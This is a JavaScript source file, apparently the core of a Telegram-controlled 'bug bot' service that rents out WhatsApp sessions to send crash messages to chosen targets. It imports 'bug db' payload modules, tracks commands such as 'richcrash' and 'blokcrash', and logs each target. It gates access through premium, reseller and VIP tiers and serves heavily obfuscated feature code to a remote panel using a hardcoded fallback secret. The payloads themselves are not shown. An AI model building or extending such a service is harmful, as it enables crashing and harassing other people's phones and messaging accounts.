//base by DGXeon (Xeon Bot Inc.)
//re-upload? recode? copy code? give credit ya :)
//YouTube: @DGXeon
//Instagram: unicorn_xeon13
//Telegram: @DGXeon
//GitHub: @DGXeon
//WhatsApp: +916909137213
//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@DGXeon
//telegram channel: https://t.me/+WEsVdEN2B9w4ZjA9

const fs = require('fs');
const path = require('path');
const axios = require('axios');
const crypto = require('crypto');
const os = require('os');

const express = require('express');
const jwt = require('jsonwebtoken');
const machineIdSync = require('node-machine-id').machineIdSync;

const {
  default: makeWASocket,
  encodeWAMessage,
  jidDecode,
  generateMessageIDV2,
  encodeSignedDeviceIdentity,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  proto,
  prepareWAMessageMedia,
  relayMessage,
} = require('@whiskeysockets/baileys');
const P = require('pino');
const TelegramBot = require('node-telegram-bot-api');
const chalk = require('chalk');
const moment = require('moment-timezone');
const escapeHtml = (text) => String(text || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

//bug db
const { xeonKingIos } = require('./69/xKingIos.js');
const { bug } = require('./69/bug.js');
const { bugUrl } = require('./69/bugUrl.js')
const o = fs.readFileSync(`./69/o.jpg`)

// === NEW: Pairing Lock System (Anti-spam + stuck lock fix) ===
const pairingLocks = new Map();   // telegramUid → true

// Session root (using your existing folder)
const sessionRoot = path.join(__dirname, 'rent-session');
if (!fs.existsSync(sessionRoot)) {
    fs.mkdirSync(sessionRoot, { recursive: true });
}

const webSessionRoot = path.join(__dirname, 'web-session');
if (!fs.existsSync(webSessionRoot)) {
  fs.mkdirSync(webSessionRoot, { recursive: true });
}

// Global counter (shared across all users for better performance)
let globalSpamCounter = 0;

// Import configuration
const CONFIG = require('./config');

// Database initialization
const db = {
  premiumUsers: loadJson('./database/premium.json'),
  OwnerUsers: loadJson('./database/Owner.json'),
  userNumbers: loadJson('./database/user_numbers.json'),
  botTokens: loadJson('./database/bot_tokens.json'),
  bannedUsers: loadJson('./database/banned.json'),
};

// === WEB SYSTEM (permanent storage) ===
let webLogins = loadJson('./database/web_logins.json') || {};
let greetingTokens = loadJson('./database/greeting_tokens.json') || {};
let commandUsage = loadJson('./database/command_usage.json') || { android: 0, ios: 0, group: 0 };
let liveConsole = loadJson('./database/live_console.json') || [];
let webPairOwners = loadJson('./database/web_pair_owners.json') || {};   // number → telegramId

const webSessions = new Map();
const webWhatsappStatus = new Map();

// === LOGIN RATE LIMIT ===
const loginAttempts = new Map(); // ip → { count, lastAttempt }
const LOGIN_RATE_LIMIT = 8;      // max attempts
const LOGIN_WINDOW = 15 * 60 * 1000; // 15 minutes

// === Force clean initialization (prevents corruption) ===
if (Array.isArray(webLogins) || !webLogins || typeof webLogins !== 'object') {
  console.log('[FIX] web_logins.json was corrupted → resetting');
  webLogins = {};
}
if (Array.isArray(greetingTokens) || !greetingTokens || typeof greetingTokens !== 'object') {
  greetingTokens = {};
}
if (!commandUsage || typeof commandUsage !== 'object' || Array.isArray(commandUsage)) {
  commandUsage = { richcrash: 0, blokcrash: 0, ios: 0, richxiosv2: 0, group: 0 };
}

if (!Array.isArray(liveConsole)) {
  liveConsole = [];
}
if (!webPairOwners || typeof webPairOwners !== 'object' || Array.isArray(webPairOwners)) {
  webPairOwners = {};
}

// Save once on boot so files are always created / fixed
saveJson('./database/web_logins.json', webLogins);
saveJson('./database/greeting_tokens.json', greetingTokens);
saveJson('./database/command_usage.json', commandUsage);
saveJson('./database/live_console.json', liveConsole);
saveJson('./database/web_pair_owners.json', webPairOwners);

// === WEB SESSION LIMITER (permanent first-claimer) ===
const activeWebSessions = new Map(); // username → Set of temporary sessionIds

// === LICENSE DATABASE ===
const licenseDB = loadJson('./database/licenses.json') || {};

// ====================== REAL APP PANEL (WebSocket Connection) ======================

// Local mapping only for permission checks (does NOT replace panel DB)
let appCreators = loadJson('./database/app_creators.json') || {};
if (Array.isArray(appCreators) || typeof appCreators !== 'object') appCreators = {};
saveJson('./database/app_creators.json', appCreators);

const WebSocket = require('ws');

const APP_CATALOG_FILE = path.join(__dirname, 'catalog.json');
const APP_MAX_PER_KIND = 4;

const JavaScriptObfuscator = require('javascript-obfuscator');

const APP_FUNCTIONS_DIR = path.join(__dirname, 'functions');

// Create functions folder if it doesn't exist
if (!fs.existsSync(APP_FUNCTIONS_DIR)) {
  fs.mkdirSync(APP_FUNCTIONS_DIR, { recursive: true });
}

const APP_WSS_URL = process.env.BOT_fWSS_URL || "wss://app.xeonbotinc.shop/bot-ws";
const APP_WSS_SECRET = process.env.BOT_WSS_SECRET || "S7ULTRAPROMAXINFINIT";
const APP_TLS_REJECT = String(process.env.BOT_TLS_REJECT_UNAUTHORIZED || "true").toLowerCase() !== "false";

let appWs = null;
let appWsOk = false;
let appPending = new Map(); // id → { resolve, reject, timer }
let appReconnectTimer = null;

function appLog(...args) {
  console.log(`[APP-WS ${new Date().toISOString()}]`, ...args);
}

function connectAppPanel() {
  if (appWs && appWs.readyState === WebSocket.OPEN) {
    appLog('Already connected');
    return;
  }

  appLog(`Connecting to ${APP_WSS_URL} ...`);
  appWsOk = false;

  appWs = new WebSocket(APP_WSS_URL, {
    rejectUnauthorized: APP_TLS_REJECT
  });

  appWs.on('open', () => {
    appLog('Connection opened → sending auth...');
    appWs.send(JSON.stringify({
      type: 'auth',
      secret: APP_WSS_SECRET
    }));
  });

  appWs.on('message', async (raw) => {
  let msg;
  try {
    msg = JSON.parse(raw.toString());
  } catch (e) {
    console.log('[APP-WS] Failed to parse:', e.message);
    return;
  }

  console.log('[APP-WS] Received:', JSON.stringify(msg));

  if (msg.type === 'auth.ok') {
    appWsOk = true;
    console.log('[APP-WS] ✅ Authenticated');
    syncCatalogToPanel();
    return;
  }

  if (msg.type === 'features.catalog.ok') {
    console.log('[catalog] panel saved buttons =', msg.count);
    return;
  }

  if (msg.type === 'auth.fail' || msg.type === 'error') {
    appWsOk = false;
    console.log('[APP-WS] ❌ Auth failed:', msg);
    return;
  }

  if (msg.type === 'response') {
    const p = appPending.get(msg.id);
    if (!p) return;
    clearTimeout(p.timer);
    appPending.delete(msg.id);
    if (msg.ok) p.resolve(msg.data);
    else p.reject(new Error(msg.error || 'server_operation_failed'));
    return;
  }

  // ===== same as original bot =====
  if (msg.type !== 'request' || !appWsOk) {
    console.log('[APP-WS] Ignoring message');
    return;
  }

  try {
    let result;

    if (msg.op === 'feature.get') {
      const code = getFunctionCode(msg.args?.name);
      if (code === null) throw new Error('feature_not_found');

      const obfuscated = JavaScriptObfuscator.obfuscate(code, {
        compact: true,
        controlFlowFlattening: true,
        controlFlowFlatteningThreshold: 1,
        deadCodeInjection: true,
        deadCodeInjectionThreshold: 0.4,
        debugProtection: false,
        disableConsoleOutput: true,
        identifierNamesGenerator: 'hexadecimal',
        renameGlobals: false,
        selfDefending: true,
        stringArray: true,
        stringArrayEncoding: ['rc4'],
        stringArrayThreshold: 1,
        transformObjectKeys: true,
        unicodeEscapeSequence: false
      }).getObfuscatedCode();

      result = { code: obfuscated, version: '1' };
    }
    else if (msg.op === 'function.list') {
      result = { functions: listFunctionCodes() };
    }
    else if (msg.op === 'status') {
      result = { connector: appWsOk, functions: listFunctionCodes().length };
    }
    else {
      throw new Error('unknown_bot_operation');
    }

    console.log(`[APP-WS] Responding OK to ${msg.id} (${msg.op})`);
    appWs.send(JSON.stringify({
      type: 'response',
      id: msg.id,
      ok: true,
      data: result
    }));

  } catch (err) {
    console.log(`[APP-WS] Responding ERROR to ${msg.id}:`, err.message);
    appWs.send(JSON.stringify({
      type: 'response',
      id: msg.id,
      ok: false,
      error: err.message || 'bot_operation_failed'
    }));
  }
});

  appWs.on('close', (code, reason) => {
    appWsOk = false;
    appWs = null;
    appLog(`Connection closed (code=${code})`);

    // Reject all pending requests
    for (const [id, p] of appPending) {
      clearTimeout(p.timer);
      p.reject(new Error('bot_server_disconnected'));
    }
    appPending.clear();

    clearTimeout(appReconnectTimer);
    appLog('Reconnecting in 3 seconds...');
    appReconnectTimer = setTimeout(connectAppPanel, 3000);
  });

  appWs.on('error', (err) => {
    appLog('❌ WebSocket Error:', err.message);
  });
}

// Start the connection when the bot starts
connectAppPanel();

function appRequest(op, args = {}) {
  return new Promise((resolve, reject) => {
    if (!appWs || appWs.readyState !== WebSocket.OPEN || !appWsOk) {
      return reject(new Error('Panel is offline'));
    }

    const id = crypto.randomBytes(12).toString('hex');

    const timer = setTimeout(() => {
      appPending.delete(id);
      reject(new Error('server_connector_timeout'));
    }, 8000);

    appPending.set(id, { resolve, reject, timer });

    appWs.send(JSON.stringify({
      type: 'request',
      id,
      op,
      args
    }));
  });
}

function generateAppPassword(length = 12) {
  return crypto.randomBytes(12).toString('base64url').slice(0, length);
}

function isValidAppUsername(name) {
  return /^[a-z0-9_.@-]{3,64}$/i.test(String(name || ''));
}

async function getAppUserRole(senderId, userBot) {
  if (CONFIG.owner.includes(senderId)) return 'owner';
  if (db.OwnerUsers.includes(senderId)) return 'reseller';
  if (await hasVipAccess(senderId, userBot)) return 'vip';
  return 'none';
}

// ====================== FUNCTIONS HELPERS ======================
function getFunctionCode(name) {
  if (!/^[a-z0-9_-]{2,80}$/.test(String(name || ''))) return null;
  const filePath = path.join(APP_FUNCTIONS_DIR, name + '.txt');
  if (!filePath.startsWith(APP_FUNCTIONS_DIR + path.sep) || !fs.existsSync(filePath)) return null;
  return fs.readFileSync(filePath, 'utf8');
}

function listFunctionCodes() {
  try {
    return fs.readdirSync(APP_FUNCTIONS_DIR)
      .filter(f => /^[a-z0-9_-]{2,80}\.txt$/.test(f))
      .map(f => f.slice(0, -4));
  } catch {
    return [];
  }
}

// ====================== CATALOG HELPERS ======================
function loadCatalog() {
  try {
    if (fs.existsSync(APP_CATALOG_FILE)) {
      return JSON.parse(fs.readFileSync(APP_CATALOG_FILE, 'utf8'));
    }
  } catch (e) {
    console.log('[catalog] load error:', e.message);
  }
  return {};
}

function saveCatalog(cat) {
  fs.writeFileSync(APP_CATALOG_FILE, JSON.stringify(cat, null, 2));
}

function getCatalogLabel(code) {
  const cat = loadCatalog();
  if (cat[code] && cat[code].label) return cat[code].label;
  return String(code || '').replace(/[_-]+/g, ' ').replace(/\b\w/g, ch => ch.toUpperCase());
}

function getCatalogKind(code) {
  const cat = loadCatalog();
  if (cat[code] && cat[code].kind) return cat[code].kind;
  const c = String(code || '').toLowerCase();
  if (c.startsWith('al')) return 'android';
  if (c.startsWith('il')) return 'iphone';
  if (c.startsWith('gl')) return 'group';
  return 'android';
}

function countCatalogKind(kind) {
  const cat = loadCatalog();
  return Object.values(cat).filter(x => x.kind === kind).length;
}

function getFullCatalog() {
  const cat = loadCatalog();
  const files = listFunctionCodes();
  const codes = new Set([...Object.keys(cat), ...files]);
  return [...codes].map(code => ({
    code,
    label: getCatalogLabel(code),
    kind: getCatalogKind(code)
  }));
}

function syncCatalogToPanel() {
  if (!appWs || appWs.readyState !== 1 || !appWsOk) return;
  const items = getFullCatalog();
  console.log('[catalog] syncing', items.length, 'buttons to panel');
  appWs.send(JSON.stringify({ type: 'features.catalog', items }));
}

/////////end of app panel/////////

// Session management
const sessions = new Map();
const whatsappStatusMap = new Map();
const rateLimits = new Map();
const RATE_LIMIT_WINDOW = 60 * 1000;
const MAX_COMMANDS_PER_WINDOW = 5;
const startTime = new Date();
const membershipCache = new Map();
const MEMBERSHIP_CACHE_TTL = 5 * 60 * 1000;

// Reactwa command specific rate limit (15 minutes cooldown after success)
const reactwaRateLimit = new Map(); // senderId → timestamp of last successful use
const REACTWA_COOLDOWN_MS = 15 * 60 * 1000; // 15 minutes in milliseconds

// Prevent spamming "No active WhatsApp session" when session dies mid-command
const sessionInvalidNotified = new Map(); // userNumber → true (already notified)

// Telegram bot initialization
const botInstances = new Map();
const bot = new TelegramBot(CONFIG.botToken, { polling: true });
botInstances.set('root', bot);

registerCommandHandlers(bot, true);

// === ANTI-PHONE NUMBER SYSTEM IN CONFIG.GROUP_ID ===
bot.on('message', async (msg) => {
  // Only monitor the specified group
  if (msg.chat.id !== parseInt(CONFIG.GROUP_ID)) return;

  // Skip bots and non-text/caption messages
  if (msg.from?.is_bot) return;
  const text = msg.text || msg.caption || '';
  if (!text) return;

  // Check for phone number
  if (containsPhoneNumber(text)) {
    try {
      const member = await bot.getChatMember(CONFIG.GROUP_ID, msg.from.id);
      // Admins and creator are exempt
      if (member.status === 'administrator' || member.status === 'creator') return;

      // Delete the message
      await bot.deleteMessage(msg.chat.id, msg.message_id);

      // Optional: send temporary warning (uncomment if you want)
      // const warning = await bot.sendMessage(msg.chat.id, '🚫 Phone numbers are not allowed in this group.');
      // setTimeout(() => bot.deleteMessage(msg.chat.id, warning.message_id).catch(() => {}), 5000);

    } catch (err) {
      console.error('Anti-phone delete error:', err.message);
    }
  }
});

// === ANTI-PHONE NUMBER SYSTEM FOR EDITED MESSAGES ===
bot.on('edited_message', async (msg) => {
  // Only monitor the specified group
  if (!msg.chat || msg.chat.id !== parseInt(CONFIG.GROUP_ID)) return;

  // Skip bots
  if (msg.from?.is_bot) return;

  // Get text or caption
  const text = msg.text || msg.caption || '';
  if (!text) return;

  // Check for phone number
  if (containsPhoneNumber(text)) {
    try {
      const member = await bot.getChatMember(CONFIG.GROUP_ID, msg.from.id);
      // Admins and creator are exempt
      if (member.status === 'administrator' || member.status === 'creator') return;

      // Delete the edited message
      await bot.deleteMessage(msg.chat.id, msg.message_id);

      // Optional: temporary warning (uncomment if desired)
      // const warning = await bot.sendMessage(msg.chat.id, '🚫 Phone numbers are not allowed (even in edits).');
      // setTimeout(() => bot.deleteMessage(msg.chat.id, warning.message_id).catch(() => {}), 5000);

    } catch (err) {
      console.error('Anti-phone delete error (edited message):', err.message);
    }
  }
});

// Utility functions

function getIndianTime() {
  return new Date().toLocaleString('en-IN', {
    timeZone: 'Asia/Kolkata',
    day: '2-digit',
    month: '2-digit',
    year: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true
  });
}

async function sendTelegramGreetingLog(commandName, senderId, target, success = true) {
  try {
    const userBot = getUserBot(bot);
    const userLink = await formatUserLink(userBot, senderId);
    
    const status = success ? '✅ Success' : '❌ Failed';
    
    await sendLogToGroup('TELEGRAM BOT LOG', 
`${status}
Command: ${commandName}
By: ${userLink}
Target: ${target}
Time: ${getIndianTime()}`);
  } catch (err) {
    console.error('Telegram log error:', err.message);
  }
}

async function formatUserLink(bot, userId, isBanned = false) {
  let rawName = 'Deleted Account';
  let username = null;
  let canClick = false;

  try {
    const chat = await bot.getChat(userId);
    rawName = [chat.first_name || '', chat.last_name || ''].filter(Boolean).join(' ') || 'Deleted Account';
    username = chat.username || null;
    canClick = true;
  } catch (error) {
    // Inaccessible or deleted account
  }

  // Always escape the display name (shown outside the link)
  let displayName = escapeHtml(rawName);

  // Determine safe text for inside the <a> tag
  let linkText;
  if (username) {
    linkText = `@${username}`;
  } else {
    // No username → use display name only if it doesn't contain dangerous chars
    if (rawName.includes('<') || rawName.includes('>')) {
      linkText = 'Distorted Name';
    } else {
      linkText = rawName; // will be escaped below
    }
  }

  const tag = isBanned
    ? ' <i>(Banned)</i>'
    : (!canClick ? ' <i>(Deleted)</i>' : '');

  if (canClick) {
    // Safe link + display name shown separately (only if we have a username, otherwise link text is the name)
    const safeLinkText = escapeHtml(linkText);
    const linkPart = `<a href="tg://user?id=${userId}">${safeLinkText}</a>`;

    if (username) {
      // Fancy name (escaped, safe outside link) + clickable @username
      return `${displayName} ${linkPart}${tag}`;
    } else {
      // No username → clickable name (already safe)
      return `${linkPart}${tag}`;
    }
  } else {
    // Deleted/inaccessible
    return `<code>${displayName}</code>${tag}`;
  }
}

function cleanBannedFromAll() {
  if (!db.bannedUsers || !Array.isArray(db.bannedUsers)) return;

  let cleaned = false;

  // Clean from Premium Users (object format)
  if (db.premiumUsers && typeof db.premiumUsers === 'object') {
    const beforeCount = Object.keys(db.premiumUsers).length;
    for (const id of db.bannedUsers) {
      if (db.premiumUsers[id]) {
        delete db.premiumUsers[id];
        cleaned = true;
      }
    }
    if (cleaned) {
      console.log(`Cleaned banned users from premium list`);
      saveJson('./database/premium.json', db.premiumUsers);
    }
  }

  // Clean from Resellers
  const resellerBefore = db.OwnerUsers.length;
  db.OwnerUsers = db.OwnerUsers.filter(id => !db.bannedUsers.includes(id));
  if (db.OwnerUsers.length !== resellerBefore) {
    cleaned = true;
    console.log(`Cleaned ${resellerBefore - db.OwnerUsers.length} banned user(s) from reseller list`);
    saveJson('./database/Owner.json', db.OwnerUsers);
  }
}

function saveJson(file, data) {
  try {
    const dir = path.dirname(file);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    
    // Improved: Force deep copy to avoid reference issues
    const dataToSave = JSON.parse(JSON.stringify(data || {}));
    fs.writeFileSync(file, JSON.stringify(dataToSave, null, 2));
    
    console.log(`[DB] Saved ${file} | Keys: ${Object.keys(dataToSave).length}`);
  } catch (err) {
    console.error(`Error saving ${file}:`, err.message);
  }
}

function loadJson(file) {
  try {
    const rawData = fs.readFileSync(file, 'utf8') || '{}';
    const data = JSON.parse(rawData);

    if (file.includes('bot_tokens.json')) {
      if (Array.isArray(data)) {
        console.log(`Converting bot_tokens.json from array to object format`);
        const newData = {};
        data.forEach(token => {
          if (typeof token === 'string' && /^\d{9,10}:[A-Za-z0-9_-]{35}$/.test(token)) {
            newData[CONFIG.owner[0] || 'default_owner'] = token;
          }
        });
        saveJson(file, newData);
        return newData;
      }
      return typeof data === 'object' && data !== null ? data : {};
    }

    if (file.includes('premium.json') && Array.isArray(data)) {
      console.log(`Converting premium.json to new object format...`);
      const newData = {};
      data.forEach(id => {
        newData[id] = { addedBy: 0, timestamp: Date.now() };
      });
      saveJson(file, newData);
      return newData;
    }

    return typeof data === 'object' && data !== null ? data : {};
  } catch (err) {
    if (err.code === 'ENOENT') {
      console.log(`[DB] ${file} not found. Creating new file...`);
      const defaultData = file.includes('licenses.json') || file.includes('premium.json') ? {} : 
                          file.includes('Owner.json') ? [] : 
                          file.includes('user_numbers.json') || file.includes('bot_tokens.json') ? {} : [];
      saveJson(file, defaultData);
      return defaultData;
    }
    console.error(`Error loading ${file}: ${err.message}`);
    return file.includes('licenses.json') || file.includes('premium.json') ? {} : [];
  }
}

// Convert old premium array to object with addedBy
function migratePremiumDB() {
  if (Array.isArray(db.premiumUsers)) {
    const newPrem = {};
    db.premiumUsers.forEach(id => {
      newPrem[id] = { addedBy: 0, timestamp: Date.now() }; // 0 = owner
    });
    db.premiumUsers = newPrem;
    saveJson('./database/premium.json', db.premiumUsers);
    console.log('✅ Premium DB migrated to reseller tracking');
  }
}

function sanitizePath(input) {
  // If input is null, undefined, or not a string → return a safe fallback
  if (!input || typeof input !== 'string') return 'unknown';
  return path.basename(input.replace(/[^0-9]/g, '')) || 'unknown';
}

function isValidPhoneNumber(number) {
  const cleaned = number.replace(/[^0-9+]/g, '');
  const phoneRegex = /^\+\d{8,15}$/;
  return phoneRegex.test(cleaned);
}

function containsPhoneNumber(text) {
  if (!text) return false;

  // Broad match for potential phone number strings
  const potentials = text.match(/(\+?[0-9][0-9\s\-\(\)\.\+]{8,30})/g) || [];

  for (let pot of potentials) {
    let cleaned = pot.replace(/[^\d+]/g, '');
    const hasPlus = cleaned.startsWith('+');
    const digits = hasPlus ? cleaned.slice(1) : cleaned;
    const digitLen = digits.length;

    // Valid international phone number length
    if ((hasPlus && digitLen >= 8 && digitLen <= 15) ||
        (!hasPlus && digitLen >= 10 && digitLen <= 15)) {
      return true;
    }
  }
  return false;
}

// ====================== WEB LOGIN HELPERS ======================
function generatePassword(length = 12) {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789!@#$%';
  let pass = '';
  for (let i = 0; i < length; i++) pass += chars.charAt(Math.floor(Math.random() * chars.length));
  return pass;
}

function parseDuration(str) {
  if (!str) return null; // unlimited
  const match = str.match(/^(\d+)([dhms])$/i);
  if (!match) return null;
  const num = parseInt(match[1]);
  const unit = match[2].toLowerCase();
  const multipliers = { d: 86400000, h: 3600000, m: 60000, s: 1000 };
  return num * (multipliers[unit] || 0);
}

function isWebLoginValid(username) {
  const data = webLogins[username];
  if (!data || data.revoked) return false;
  if (data.expiry && new Date(data.expiry) < new Date()) return false;
  return true;
}

async function sendLogToGroup(type, content) {
  try {
    const text = `<b>${type}</b>\n\n${content}`;
    await bot.sendMessage(CONFIG.LOG_GROUP_ID, text, { parse_mode: 'HTML', disable_web_page_preview: true });
  } catch (e) {
    console.error('Log send error:', e.message);
  }
}

// ────────────────────────────────────────────────
// System resource helpers
// ────────────────────────────────────────────────

function formatSize(bytes) {
  if (bytes === 0) return '0 Bytes';
  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.floor(Math.log(bytes) / Math.log(1024));
  return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i];
}

function getFormattedRAM() {
  const total = os.totalmem();
  const free  = os.freemem();
  const used  = total - free;

  return `${formatSize(used)} / ${formatSize(total)}`;
}

function getCPUInfo() {
  if (os.loadavg) {
    const [load1] = os.loadavg();
    const cores = os.cpus().length;
    return `${load1.toFixed(2)} (1m) / ${cores} cores`;
  }
  return "CPU info unavailable";
}

function getUserBot(currentBot) {
  if (!currentBot) {
    console.warn('No currentBot provided, falling back to root bot');
  }
  return currentBot || botInstances.get('root');
}

async function checkMembership(chatId, senderId, isRootBot) {
  if (!isRootBot) {
    return { isMember: true };
  }
  
  if (CONFIG.owner.includes(senderId)) {
    return { isMember: true };
  }

  const userBot = getUserBot(botInstances.get('root'));
  console.log(`Checking membership for chat ${chatId} using bot ${await userBot.getMe().then(info => `@${info.username}`)}`);

  const cacheKey = `${senderId}:membership`;
  const cached = membershipCache.get(cacheKey);
  if (cached && Date.now() - cached.timestamp < MEMBERSHIP_CACHE_TTL) {
    console.log(`Using cached membership status for ${senderId}: ${cached.isMember}`);
    if (cached.isMember) {
      return { isMember: true };
    }
  }

  let retries = 2;
  while (retries > 0) {
    try {
            const channelStatus = await userBot.getChatMember(CONFIG.CHANNEL_ID, senderId);
      const groupStatus = await userBot.getChatMember(CONFIG.GROUP_ID, senderId);

      const isChannelMember = ['member', 'administrator', 'creator'].includes(channelStatus.status);
      const isGroupMember = ['member', 'administrator', 'creator'].includes(groupStatus.status);

      if (isChannelMember && isGroupMember) {
      
      // Check ban ONLY here (after confirming membership)
        if (db.bannedUsers.includes(senderId)) {
          await userBot.sendMessage(chatId, `You are permanently banned from using this bot.\nPlease contact owner: ${CONFIG.usertele}`);
          membershipCache.set(cacheKey, { isMember: false, timestamp: Date.now() });
          return { isMember: false };
        }
      
        membershipCache.set(cacheKey, { isMember: true, timestamp: Date.now() });
        return { isMember: true };
      }

      const missing = [];
      const buttons = [];
      if (!isChannelMember) {
        missing.push('channel');
        buttons.push([{ text: '📢 Join Channel', url: CONFIG.CHANNEL_INVITE_LINK }]);
      }
      
      if (!isGroupMember) {
        missing.push('group');
        buttons.push([{ text: '👥 Join Group', url: CONFIG.GROUP_LINK }]);
      }
      
            buttons.push([{ text: '📱 Follow WhatsApp', url: CONFIG.WHATSAPP_LINK }]);
      buttons.push([{ text: '🎥 Subscribe YouTube', url: CONFIG.YOUTUBE_LINK }]);
      buttons.push([{ text: '📸 Follow Instagram', url: CONFIG.INSTAGRAM_LINK }]);
      buttons.push([{ text: '✅ Check Membership', callback_data: 'check_membership' }]);

      await userBot.sendMessage(chatId, `❌ You must subscribe my telegram channel to use this bot. After doing so, click "Check Membership" or use /checkmembership.`, {
        reply_markup: {
          inline_keyboard: buttons,
        },
      });

      membershipCache.set(cacheKey, { isMember: false, timestamp: Date.now() });     
      return { isMember: false };
    } catch (error) {
      console.error(`Error checking membership for ${senderId} (retry ${3 - retries}): ${error.message}`);
      retries--;
      if (retries === 0) {
        await userBot.sendMessage(chatId, `❌ Failed to verify membership due to an error. Please try /checkmembership later or contact ${CONFIG.usertele}`);
        membershipCache.set(cacheKey, { isMember: false, timestamp: Date.now() });
        return { isMember: false };
      }
      await sleep(1000);
    }
  }
}

async function checkVipMembership(senderId, userBot) {
  const cacheKey = `${senderId}:vip_membership`;
  const cached = membershipCache.get(cacheKey);
  if (cached && Date.now() - cached.timestamp < MEMBERSHIP_CACHE_TTL) {
    return cached.isMember;
  }

  try {
    const vipStatus = await userBot.getChatMember(CONFIG.VIP_CHANNEL_ID, senderId);
    const isVipMember = ['member', 'administrator', 'creator'].includes(vipStatus.status);
    membershipCache.set(cacheKey, { isMember: isVipMember, timestamp: Date.now() });
    return isVipMember;
  } catch (error) {
    console.error(`Error checking VIP membership for ${senderId}: ${error.message}`);
    return false;  // If error, don't grant access
  }
}

// === UNIFIED VIP ACCESS CHECK (Updated for object DB) ===
async function hasVipAccess(senderId, userBot) {
  // 1. Owners always have access
  if (CONFIG.owner.includes(senderId)) {
    return true;
  }

  // 2. Resellers always have access
  if (db.OwnerUsers.includes(senderId)) {
    return true;
  }

  // 3. Users in premium.json database (NEW OBJECT FORMAT)
  if (db.premiumUsers && typeof db.premiumUsers === 'object' && db.premiumUsers[senderId]) {
    return true;
  }

  // 4. Members of VIP Channel
  const isVipChannelMember = await checkVipMembership(senderId, userBot);
  if (isVipChannelMember) {
    return true;
  }

  return false;
}

function checkRateLimit(senderId, chatId) {
  const now = Date.now();
  let userLimit = rateLimits.get(senderId);
  if (!userLimit || now - userLimit.lastReset > RATE_LIMIT_WINDOW) {
    rateLimits.set(senderId, { count: 1, lastReset: now });
    return true;
  }
  if (userLimit.count >= MAX_COMMANDS_PER_WINDOW) {
    const userBot = getUserBot(botInstances.get('root'));
    userBot.sendMessage(chatId, `❌ Rate limit exceeded. Try again in ${Math.ceil((RATE_LIMIT_WINDOW - (now - userLimit.lastReset)) / 1000)} seconds.`);
    return false;
  }
  userLimit.count++;
  return true;
}

function getOnlineDuration() {
  const onlineDuration = new Date() - startTime;
  const seconds = Math.floor((onlineDuration / 1000) % 60);
  const minutes = Math.floor((onlineDuration / (1000 * 60)) % 60);
  const hours = Math.floor((onlineDuration / (1000 * 60 * 60)) % 24);
  const days = Math.floor(onlineDuration / (1000 * 60 * 60 * 24));
  const years = Math.floor(days / 365);
  const remainingDays = days % 365;

  if (years > 0) {
    return `${years} year${years > 1 ? 's' : ''} ${remainingDays} day${remainingDays !== 1 ? 's' : ''} ${hours} hour${hours !== 1 ? 's' : ''} ${minutes} minute${minutes !== 1 ? 's' : ''}`;
  } else if (days > 0) {
    return `${days} day${days > 1 ? 's' : ''} ${hours} hour${hours !== 1 ? 's' : ''} ${minutes} minute${minutes !== 1 ? 's' : ''}`;
  } else {
    return `${hours}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
  }
}

async function deleteFolderRecursive(dir) {
  try {
    if (fs.existsSync(dir)) {
      fs.readdirSync(dir).forEach((file) => {
        const curPath = path.join(dir, file);
        if (fs.lstatSync(curPath).isDirectory()) {
          deleteFolderRecursive(curPath);
        } else {
          fs.unlinkSync(curPath);
        }
      });
      fs.rmdirSync(dir);
      console.log(`Deleted session folder: ${dir}`);
    }
  } catch (err) {
    console.error(`Error deleting folder ${dir}:`, err.message);
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// === GET LID / NUMBER / GROUP ID via 🥰 emoji ===
function attachLidEmojiHandler(sock, number, botInstance) {
  if (sock._lidEmojiHandlerAttached) return;
  sock._lidEmojiHandlerAttached = true;

  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if (type !== 'notify') return;

    for (const m of messages) {
      try {
        const isGroup = m.key.remoteJid?.endsWith('@g.us');
        if (m.key.remoteJid === 'status@broadcast') continue;

        const text =
          m.message?.conversation ||
          m.message?.extendedTextMessage?.text ||
          m.message?.imageMessage?.caption ||
          m.message?.videoMessage?.caption ||
          '';

        if (!text.includes('🥰')) continue;

        let targetJid = null;
        let isGroupTarget = false; // true when we want the group itself

        // ========== GROUP ==========
        if (isGroup) {
          const ctx = m.message?.extendedTextMessage?.contextInfo;

          // 1. Mentioned user
          if (ctx?.mentionedJid?.length > 0) {
            targetJid = ctx.mentionedJid[0];
          }
          // 2. Quoted message
          else if (ctx?.participant) {
            targetJid = ctx.participant;
          }
          // 3. No mention & no quote → return the GROUP itself
          else {
            targetJid = m.key.remoteJid;
            isGroupTarget = true;
          }
        }
        // ========== PRIVATE CHAT ==========
        else {
          targetJid = m.key.remoteJid;
        }

        if (!targetJid) continue;

        // Prefer LID when available
        let finalId = targetJid;

        if (!isGroupTarget) {
          // Person target – try to get LID
          finalId =
            (m.key.remoteJidAlt?.endsWith('@lid') && !isGroup) ? m.key.remoteJidAlt :
            m.key.senderLid ||
            (targetJid.endsWith('@lid') ? targetJid : null) ||
            targetJid;

          if (finalId.endsWith('@s.whatsapp.net') && sock.signalRepository?.lidMapping?.getLIDForPN) {
            try {
              const mapped = await sock.signalRepository.lidMapping.getLIDForPN(finalId);
              if (mapped) finalId = mapped;
            } catch (_) {}
          }

          // Extra from context
          if (isGroup && finalId.endsWith('@s.whatsapp.net')) {
            const ctx = m.message?.extendedTextMessage?.contextInfo;
            if (ctx?.participantAlt?.endsWith('@lid')) finalId = ctx.participantAlt;
            else if (ctx?.remoteJidAlt?.endsWith('@lid')) finalId = ctx.remoteJidAlt;
          }
        }

        const isLid = finalId.endsWith('@lid');
        const isGroupJid = finalId.endsWith('@g.us');

        // Display value
        let displayValue;
        if (isLid) {
          displayValue = finalId;
        } else if (isGroupJid) {
          displayValue = finalId;               // keep full group id
        } else {
